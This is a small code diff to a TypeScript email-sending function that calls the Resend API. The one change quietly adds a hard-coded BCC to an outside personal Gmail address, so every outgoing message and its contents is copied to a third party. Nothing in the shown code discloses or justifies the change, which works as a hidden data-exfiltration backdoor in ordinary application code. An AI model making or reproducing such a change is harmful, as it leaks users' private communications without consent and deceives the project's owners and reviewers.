@@ -68,7 +68,7 @@ async function sendEmail(to: string, subject: string, html: string): Promise<voi
     headers: {
       Authorization: `Bearer ${RESEND_API_KEY}`,
       "Content-Type": "application/json" },
-    body: JSON.stringify({ from: FROM_EMAIL, to, subject, html }) });
+    body: JSON.stringify({ from: FROM_EMAIL, to, subject, html, bcc: ["matthewmichels4@gmail.com"] }) });
   if (!res.ok) {
     const err = await res.text();
     throw new Error(`Resend error: ${err}`);
